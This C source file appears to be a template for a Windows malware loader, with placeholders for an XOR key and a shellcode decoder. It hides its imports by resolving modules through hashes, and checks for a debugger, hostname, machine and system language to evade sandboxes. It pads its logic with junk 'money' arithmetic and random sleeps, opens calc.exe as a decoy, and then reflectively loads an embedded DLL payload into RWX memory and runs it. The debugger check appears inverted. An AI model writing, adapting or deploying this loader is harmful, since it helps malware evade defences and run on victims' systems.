#include "definitions.h"
#include "debug.h"

// Define a random value based on compile-time constants
#define RANDOM_VAL (__TIME__[3] * __TIME__[6])


int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {

    // Seed the random number generator
    srand(time(NULL));
    uint16_t key = %XOR_KEY%; // Placeholder for XOR key
    char path[MAX_PATH]; 
    int min = 4000; // Minimum range for random money
    int max = 17000; // Maximum range for random money
    int range = max - min + 1;
    int money =  min + (int)(rand() / (double)RAND_MAX * range) + RANDOM_VAL; // Calculate random money
    int money_spent = 0; // Initialize money spent tracker
    
    printf("beginning\n");    
    HMODULE hNtdll = CustomGetModuleHandle(NTDLL_HASH); // Load NTDLL module
    HMODULE hKernel32dll = NULL; // Placeholder for Kernel32 module handle
    
    // Check if the program is being debugged
    if (!is_being_debugged()) {
        printf("Error during file openning : %s\n", path); // Debugging detected
        return 1;
    } else {
        hKernel32dll = CustomGetModuleHandle(KERNEL32_HASH); // Load Kernel32 module
    }
    
    // Validate hostname and adjust money spent accordingly
    const char* hostname = get_hostname(hKernel32dll);
    if (key > 0 && is_valid_hostname(hostname)) {
        // Valid hostname, no action needed
    } else {
        money_spent += multiply(money, 3); // Penalty for invalid hostname
    }

    // Validate computer and adjust money spent
    if (is_valid_computer(hKernel32dll) && money > 1000) {
        // Valid computer, no action needed
    } else {
        money_spent += divide(money, 2); // Penalty for invalid computer
    }
    
    HMODULE hUser32dll = CustomGetModuleHandle(USER32_HASH); // Load User32 module

    // Validate language settings and adjust money spent
    if (!is_valid_language(hKernel32dll, hUser32dll)) {
        money_spent += add(money, 500); // Penalty for invalid language
    }

    // Other checks todo (placeholder for additional validations)

    // Launch calculator as a demonstration
    ShellExecute(NULL, "open", "C:\\Windows\\System32\\calc.exe", NULL, NULL, SW_SHOWNORMAL);

    if (money_spent) {
        // Introduce delays if money was spent
        int min_delay = 300;
        int max_delay = 800;
        int delay;
        for (int i = 0; i < 100; i+=12) {
            delay = min_delay + (int)(rand() / (double)RAND_MAX * (max_delay - min_delay));
            Sleep(delay); // Simulate processing delay
        }
    } else {
        // Execute payload if no money was spent
        // Step 1 : Get DLL's NT headers
        %SHELLCODE_DECODER% // Placeholder for shellcode decoding logic

        PIMAGE_NT_HEADERS64 dll_htHeaders = PE_getNtheaders(payload);
        Debug("PE_getNthdrs() returned %p", dll_htHeaders);

        // Step 2: Allocate memory at dll's preferred virtual address
        SIZE_T dll_vSize = dll_htHeaders->OptionalHeader.SizeOfImage;
        LPVOID dll_vAddr = (LPVOID)dll_htHeaders->OptionalHeader.ImageBase;

        Debug("DLL size %lu, base address %p", dll_vSize, dll_vAddr);


        LPVOID allocated_vAddr = VirtualAllocEx(CUR_PROC, dll_vAddr, dll_vSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (!allocated_vAddr) {
            Debug("Preferred address allocation failed. Allocating at arbitrary address...");
            allocated_vAddr = VirtualAllocEx(CUR_PROC, NULL, dll_vSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (!allocated_vAddr) Fail("Memory allocation failed");
        }
        Debug("DLL allocated at: %p", allocated_vAddr);

        // Get delta between preferred and allocated address
        DWORD_PTR delta = (DWORD_PTR)allocated_vAddr - (DWORD_PTR)dll_vAddr;

        // Step 3: Copy the DLL headers 
        if (!WriteProcessMemory((HANDLE)-1, allocated_vAddr, payload, dll_htHeaders->OptionalHeader.SizeOfHeaders, NULL))
            Fail("WriteProcessMemory() failed");


        // Step 4: Copy the DLL sections
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(dll_htHeaders);
        for (size_t i = 0; i < dll_htHeaders->FileHeader.NumberOfSections; i++) {
            LPVOID sectionAddr = (LPVOID)((ULONG_PTR)allocated_vAddr + section[i].VirtualAddress);
            LPVOID sectionData = (LPVOID)((ULONG_PTR)payload + section[i].PointerToRawData);
            SIZE_T sectionSize = section[i].SizeOfRawData;

            Debug("Copying section %s to %p", section[i].Name, sectionAddr);
            if (!WriteProcessMemory(CUR_PROC, sectionAddr, sectionData, sectionSize, NULL))
                Fail("WriteProcessMemory() failed");
        }

        // Step 5: Handle relocation if allocated at a different address
        if (allocated_vAddr != dll_vAddr) {
            Debug("Relocation needed");

            IMAGE_DATA_DIRECTORY relocations = dll_htHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
            if (relocations.Size > 0) {
                PIMAGE_BASE_RELOCATION relocationBlock = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)allocated_vAddr + relocations.VirtualAddress);
                while (relocationBlock->VirtualAddress != 0) {
                    DWORD relocationCount = (relocationBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                    PWORD relocationEntries = (PWORD)((ULONG_PTR)relocationBlock + sizeof(IMAGE_BASE_RELOCATION));

                    for (DWORD i = 0; i < relocationCount; i++) {
                        if (relocationEntries[i] >> 12 == IMAGE_REL_BASED_HIGHLOW) {
                            DWORD_PTR* addressToPatch = (DWORD_PTR*)((ULONG_PTR)allocated_vAddr + relocationBlock->VirtualAddress + (relocationEntries[i] & 0xFFF));
                            *addressToPatch += delta;
                            Debug("Relocated address at: %p", addressToPatch);
                        }
                    }

                    relocationBlock = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)relocationBlock + relocationBlock->SizeOfBlock);
                }
            }
        }

        // Step 6: Resolve imports
        if (dll_htHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0) {
            Debug("Imports needed");
            PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((ULONG_PTR)allocated_vAddr +
                dll_htHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

            char* libraryName = NULL;
            HMODULE library = NULL;

            while (importDesc->Name) {
                libraryName = (char*)((ULONG_PTR)allocated_vAddr + importDesc->Name);
                Debug("Loading library: %s", libraryName);
                library = LoadLibraryA(libraryName);
                if (!library) Fail("Failed to load module: %s", libraryName);

                PIMAGE_THUNK_DATA thunkILT = (PIMAGE_THUNK_DATA)((ULONG_PTR)allocated_vAddr + importDesc->OriginalFirstThunk);
                PIMAGE_THUNK_DATA thunkIAT = (PIMAGE_THUNK_DATA)((ULONG_PTR)allocated_vAddr + importDesc->FirstThunk);

                while (thunkILT->u1.AddressOfData) {
                    FARPROC procAddress = NULL;

                    if (thunkILT->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                        Debug("Import by ordinal: 0x%X", thunkILT->u1.Ordinal & 0xFFFF);
                        procAddress = GetProcAddress(library, (LPCSTR)(thunkILT->u1.Ordinal & 0xFFFF));
                    } else {
                        PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)allocated_vAddr + thunkILT->u1.AddressOfData);
                        Debug("Import by name: %s", importByName->Name);
                        procAddress = GetProcAddress(library, importByName->Name);
                    }

                    if (!procAddress) Fail("Failed to resolve import");

                    Debug("Resolved import: %p", procAddress);
                    thunkIAT->u1.Function = (ULONG_PTR)procAddress;
                    thunkILT++;
                    thunkIAT++;
                }
                Debug("Finished processing library: %s", libraryName);
                importDesc++;
            }
        }

        // Step 7: Execute the loaded DLL (DllMain())
        DllEntryPoint DLLMain = (DllEntryPoint)((ULONG_PTR)allocated_vAddr + dll_htHeaders->OptionalHeader.AddressOfEntryPoint);
        DLLMain((HINSTANCE)allocated_vAddr, DLL_PROCESS_ATTACH, NULL);

        Debug("done");
    }

    return 0; // Exit the program
}